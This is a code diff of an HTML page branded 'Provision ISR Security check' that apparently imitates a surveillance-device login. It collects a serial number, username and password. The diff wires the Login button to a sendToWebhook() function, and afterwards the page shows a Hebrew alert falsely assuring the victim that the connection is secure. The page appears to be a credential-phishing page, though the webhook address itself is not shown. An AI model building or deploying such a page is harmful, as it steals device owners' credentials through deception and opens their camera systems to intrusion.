@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title> Provision ISR Security check 🔐 </title>
+    <title>Provision ISR Security check 🔐</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" media="screen" />
     <meta http-equiv="Expires" content="0">
@@ -34,20 +34,23 @@
             <div id="webNameImg"></div>
             <div id="container">
                 <div id="accountLoginWrap">
-                    <form id="loginForm" action="javascript:void(0);"> 
+                    <form id="loginForm" action="javascript:void(0);">
+                        <div class="itemWrap">
+                            <i class="icon sn-icon"></i>
+                            <input type="text" id="txtAccountSN" name="sn" placeholder="Enter Serial Number" class="txt-input" autocomplete="off" />
+                        </div>
                         <ul id="snListStroage"></ul>
                         <div class="itemWrap">
-    <i class="icon sn-icon"></i>
-    <input type="text" id="txtAccountSN" name="sn" placeholder="Enter Serial Number" class="txt-input" autocomplete="off" />
-</div>
-<div class="itemWrap">
-    <i class="icon user-icon"></i>
-    <input id="txtUserName" name="username" placeholder="Enter Username" class="txt-input" type="text" />
-</div>
-<div class="itemWrap">
-    <i class="icon pwd-icon"></i>
-    <input id="txtPassword" name="password" placeholder="Enter Password" class="txt-input" type="password" autocomplete="off" />
-</div>
+                            <i class="icon user-icon"></i>
+                            <input id="txtUserName" name="username" placeholder="Enter Username" class="txt-input" type="text" />
+                        </div>
+                        <div class="itemWrap">
+                            <i class="icon pwd-icon"></i>
+                            <input id="txtPassword" name="password" placeholder="Enter Password" class="txt-input" type="password" autocomplete="off" />
+                        </div>
+                        <div class="itemWrap">
+                            <button id="btnAccountLogin" class="cfgBtn" lc="html" lk="IDCS_LOGIN_NBSP" onclick="sendToWebhook()">Login</button>
+                        </div>
                     </form>
                 </div>
                 <div id="ErrorMsg"></div>
@@ -76,13 +79,9 @@
                     alert('✅️ החיבור שלך מאובטח.');
                 })
                 .catch(error => {
-                    alert(' ❌️ תקלה בבדיקת אבטחה' + error);
+                    alert('❌️ תקלה בבדיקת אבטחה' + error);
                 });
         }
     </script>
 </body>
 </html>
-
- 
- 
- 
